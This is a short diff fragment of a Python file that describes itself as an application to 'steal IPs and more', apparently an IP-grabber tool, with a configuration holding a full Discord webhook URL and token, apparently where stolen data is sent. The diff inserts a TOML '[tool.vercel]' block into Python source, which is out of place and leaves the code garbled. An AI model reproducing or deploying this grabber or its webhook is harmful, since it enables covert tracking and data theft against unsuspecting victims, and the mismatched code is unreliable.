@@ -10,6 +10,9 @@ __description__ = "A simple application which allows you to steal IPs and more b
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
+[tool.vercel]
+entrypoint = "my_package.api:app"
+
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
